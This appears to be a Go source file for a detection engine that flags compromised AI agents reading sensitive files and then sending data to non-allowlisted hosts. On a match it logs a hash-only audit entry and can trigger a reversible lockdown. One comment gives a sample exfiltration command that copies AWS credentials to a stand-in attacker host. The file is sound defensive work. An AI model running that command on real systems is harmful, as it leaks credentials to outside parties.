// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 Abysslink Contributors
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package sentinel

import (
	"context"
	"encoding/json"
	"log/slog"
	"sync"
	"time"
)

// Default window bounds. The RULE is an ordered, windowed fusion of two leg
// signals: a SENSITIVE-READ leg followed by an EGRESS leg observed on the SAME
// exec stream (one Engine instance = one daemon process's gated Runner; the
// window is not keyed per agent/session), within DefaultWindowExecs execs AND
// DefaultWindowSeconds seconds, in that order.
// Either leg alone never fires. These defaults are the LOOSEST allowed — config
// may only TIGHTEN them (a smaller window is stricter).
const (
	DefaultWindowExecs   = 5
	DefaultWindowSeconds = 60
)

// SentinelReason is the short machine reason recorded as the audit target and
// passed to the quarantine hook. It is NOT a free-text body and carries no
// secret.
const SentinelReason = "compromised-agent-signal"

// opSentinelDetection is the audit op-code for a fired detection.
const opSentinelDetection = "sentinel-detection" //nolint:gosec // G101: audit op-code identifier, not a credential

// AuditAppender appends one hash-only entry to the audit chain. *audit.Audit
// satisfies it: content is HASHED (SHA-256) into the entry, never stored. A nil
// appender is tolerated (the engine guards it) so tests can pass nil.
type AuditAppender interface {
	Append(op, target string, content []byte, dryRun bool) error
}

// QuarantineFunc degrades the session on a fired detection (Tier 1). Production
// wires deadman.Lockdown (non-destructive, reversible: disarm armed pgids +
// latch the lockdown flag). It is nil-tolerant — the CLI composition root wires
// flag+audit only (nil), the daemon wires the full Lockdown closure.
type QuarantineFunc func(ctx context.Context, reason string) error

// Config is the resolved runtime configuration for the engine. It is a
// standalone type (the engine never imports internal/config); the composition
// root maps config.SentinelConfig onto it.
type Config struct {
	// Enabled gates the whole detector. A disabled engine is a pure no-op tap.
	Enabled bool
	// Quarantine enables Tier 1 (the reversible lockdown) on a fired detection.
	// Ships false: the always-on default posture is flag+audit only.
	Quarantine bool
	// WindowExecs is the max exec distance between the read and egress legs.
	// Zero resolves to DefaultWindowExecs. Values are TIGHTEN-ONLY at the config
	// layer (never larger than the default).
	WindowExecs int
	// WindowSeconds is the max wall-clock gap between the legs. Zero resolves to
	// DefaultWindowSeconds. TIGHTEN-ONLY at the config layer.
	WindowSeconds int
	// ExtraSensitivePaths are ADD-ONLY extra sensitive path prefixes/basenames,
	// union-merged with the compiled defaults.
	ExtraSensitivePaths []string
	// ExtraAllowlist are ADD-ONLY extra benign egress hosts, union-merged with
	// the compiled defaults (registries, tailnet, loopback).
	ExtraAllowlist []string
}

// Option configures an Engine at construction.
type Option func(*Engine)

// WithAudit injects the hash-only audit appender. Nil is tolerated.
func WithAudit(a AuditAppender) Option { return func(e *Engine) { e.audit = a } }

// WithQuarantine injects the Tier 1 quarantine hook. Nil is tolerated (the
// engine falls back to flag+audit only).
func WithQuarantine(fn QuarantineFunc) Option { return func(e *Engine) { e.quarantineFn = fn } }

// WithLogger overrides the logger (default slog.Default()).
func WithLogger(l *slog.Logger) Option { return func(e *Engine) { e.log = l } }

// WithClock overrides the clock (default time.Now) — a test seam for the
// windowing edge cases.
func WithClock(now func() time.Time) Option { return func(e *Engine) { e.clock = now } }

// Engine is the deterministic detection engine. It is safe for concurrent use.
type Engine struct {
	enabled      bool
	quarantine   bool
	windowN      uint64
	windowT      time.Duration
	vocab        *vocabulary
	audit        AuditAppender
	quarantineFn QuarantineFunc
	log          *slog.Logger
	clock        func() time.Time

	mu      sync.Mutex
	seq     uint64
	pending []readEvent

	// quarantineWG tracks in-flight async quarantine dispatches so tests can
	// deterministically await them (the kill-ladder runs off the exec hot path).
	quarantineWG sync.WaitGroup
}

// readEvent is a recorded sensitive-read leg awaiting a possible egress leg.
type readEvent struct {
	seq      uint64
	at       time.Time
	category string // generic label, never the raw path
	readBin  string // generic binary name (e.g. "cat"), never a secret
}

// detectionRecord is the canonical hash-only JSON recorded for a fired
// detection. HYGIENE: it carries generic binary names, a category LABEL, and a
// numeric distance only — NEVER the raw sensitive path, the egress host, argv,
// env, or stdin (D-38/T-27-14). content is hashed by Append anyway, but the
// slog mirror prints it, so it must stay clean.
type detectionRecord struct {
	V            int    `json:"v"`
	TS           string `json:"ts"`
	ReadBinary   string `json:"read_binary"`
	ReadCategory string `json:"read_category"`
	EgressBinary string `json:"egress_binary"`
	EgressTarget string `json:"egress_target"` // generic label, e.g. "non-allowlisted-host"
	SeqDistance  int    `json:"seq_distance"`
	Method       string `json:"method"`
}

// NewEngine builds an Engine from cfg. A disabled cfg yields a no-op engine
// (the returned pointer is still valid and cheap to call). Window values are
// resolved from the defaults when zero; the config layer has already rejected
// any loosening.
func NewEngine(cfg Config, opts ...Option) *Engine {
	n := cfg.WindowExecs
	if n <= 0 {
		n = DefaultWindowExecs
	}
	t := cfg.WindowSeconds
	if t <= 0 {
		t = DefaultWindowSeconds
	}
	e := &Engine{
		enabled:    cfg.Enabled,
		quarantine: cfg.Quarantine,
		// #nosec G115 -- n is > 0 here (defaulted from the <=0 guard above; config validates the range [1, DefaultWindowExecs]); the int->uint64 conversion cannot overflow
		windowN: uint64(n), //nolint:gosec // G115: n is > 0 here — no overflow
		windowT: time.Duration(t) * time.Second,
		vocab:   newVocabulary(cfg.ExtraSensitivePaths, cfg.ExtraAllowlist),
		log:     slog.Default(),
		clock:   time.Now,
	}
	for _, o := range opts {
		o(e)
	}
	return e
}

// Enabled reports whether the engine is armed. A nil engine reports false.
func (e *Engine) Enabled() bool { return e != nil && e.enabled }

// observe feeds one exec's argv to the detector. It is nil-receiver safe, a
// no-op when disabled, and NEVER blocks, fails, or panics out (T-27-17): all
// work happens under a defer recover(), the work is O(few string compares), and
// nothing propagates back to the delegated exec.
func (e *Engine) observe(ctx context.Context, method, name string, args []string) {
	if e == nil || !e.enabled {
		return
	}
	defer func() { _ = recover() }() // T-27-17: the tap must never fail an exec

	e.mu.Lock()
	defer e.mu.Unlock()

	e.seq++
	now := e.clock()

	kind, label := e.vocab.classify(name, args)
	switch kind {
	case legRead:
		e.prune(now)
		e.pending = append(e.pending, readEvent{
			seq:      e.seq,
			at:       now,
			category: label,
			readBin:  baseName(name),
		})
	case legEgress:
		e.prune(now)
		// Self-contained single-command exfil: the egress command's OWN argv
		// references a sensitive path AND targets a non-allowlisted host (e.g.
		// `scp ~/.aws/credentials attacker@evil.example.com:`). This is the
		// highest-precision case — one command literally reads a secret and sends
		// it — so it fires immediately (distance 0) and does not also consume a
		// pending read.
		if cat, ok := e.vocab.matchSensitive(args); ok {
			e.fire(ctx, method, readEvent{seq: e.seq, at: now, category: cat, readBin: baseName(name)}, baseName(name), label, now)
			return
		}
		// Otherwise the two-leg ordered fusion. Scan newest-first for a pending
		// read still inside the window. Ordering is guaranteed (read seq < egress
		// seq); the window bounds both the exec distance and the wall-clock gap.
		for i := len(e.pending) - 1; i >= 0; i-- {
			r := e.pending[i]
			if e.seq-r.seq <= e.windowN && now.Sub(r.at) <= e.windowT {
				e.fire(ctx, method, r, baseName(name), label, now)
				// Consume the matched read so a second egress does not re-fire on
				// the same read (each ordered pair fires exactly once).
				e.pending = append(e.pending[:i], e.pending[i+1:]...)
				break
			}
		}
	case legNone:
		// Neither leg. Still prune stale reads so the pending set stays bounded.
		e.prune(now)
	}
}

// prune drops pending reads that have fallen outside the window on either axis.
// Called under e.mu.
func (e *Engine) prune(now time.Time) {
	if len(e.pending) == 0 {
		return
	}
	kept := e.pending[:0]
	for _, r := range e.pending {
		if e.seq-r.seq <= e.windowN && now.Sub(r.at) <= e.windowT {
			kept = append(kept, r)
		}
	}
	e.pending = kept
}

// fire emits the always-on Tier 0 signal (hash-only audit + slog.Warn) and,
// only when quarantine is enabled AND a hook is wired, invokes Tier 1. Called
// under e.mu.
func (e *Engine) fire(ctx context.Context, method string, r readEvent, egressBin, egressLabel string, now time.Time) {
	rec := detectionRecord{
		V:            1,
		TS:           now.UTC().Format(time.RFC3339),
		ReadBinary:   r.readBin,
		ReadCategory: r.category,
		EgressBinary: egressBin,
		EgressTarget: egressLabel,
		// #nosec G115 -- the distance is bounded by the window (<= windowN, a small int); the uint64->int conversion cannot overflow
		SeqDistance: int(e.seq - r.seq), //nolint:gosec // G115: bounded by the window — no overflow
		Method:      method,
	}
	content, err := json.Marshal(rec)
	if err != nil {
		// Serialization failure must not suppress the detection: log LOUD and
		// still slog.Warn + quarantine below.
		e.log.Warn("sentinel: detection record serialization failed", "err", err)
		content = nil
	}

	// Tier 0 — ALWAYS: hash-only audit append. An append failure degrades LOUD
	// (the detection stands); an audit failure can make a detection louder,
	// never suppress it (quorum/audit.go precedent).
	if e.audit != nil {
		if aerr := e.audit.Append(opSentinelDetection, "exec:"+egressBin, content, false); aerr != nil {
			e.log.Warn("sentinel: detection audit append failed — detection stands", "err", aerr)
		}
	}
	e.log.Warn("sentinel: exfil pattern detected (sensitive-read then non-allowlisted egress)",
		"read_binary", r.readBin,
		"read_category", r.category,
		"egress_binary", egressBin,
		"seq_distance", e.seq-r.seq,
		"method", method,
	)

	// Tier 1 — QUARANTINE: only behind config and only when a hook is wired.
	// Reversible/non-destructive (deadman.Lockdown). Dispatched on a DETACHED
	// goroutine: the hook drives the SIGTERM->grace->SIGKILL kill-ladder, which
	// blocks for the grace period — running it inline would stall the triggering
	// exec AND (fire runs under e.mu) every concurrent observed exec, violating
	// the never-block tap discipline (T-27-17). The exec that tripped detection
	// has already run; quarantine tears the session down behind it, off the hot
	// path. context.WithoutCancel keeps the kill from being cut short when the
	// triggering exec's ctx is cancelled on return. Recovered so a hook panic
	// never escapes.
	if e.quarantine && e.quarantineFn != nil {
		qctx := context.WithoutCancel(ctx)
		e.quarantineWG.Go(func() {
			defer func() { _ = recover() }()
			if qerr := e.quarantineFn(qctx, SentinelReason); qerr != nil {
				e.log.Warn("sentinel: quarantine hook error", "err", qerr)
			}
		})
	}
}

// waitQuarantine blocks until all in-flight async quarantine dispatches finish.
// Test-only synchronisation seam; production callers never wait on the tap.
func (e *Engine) waitQuarantine() {
	if e == nil {
		return
	}
	e.quarantineWG.Wait()
}
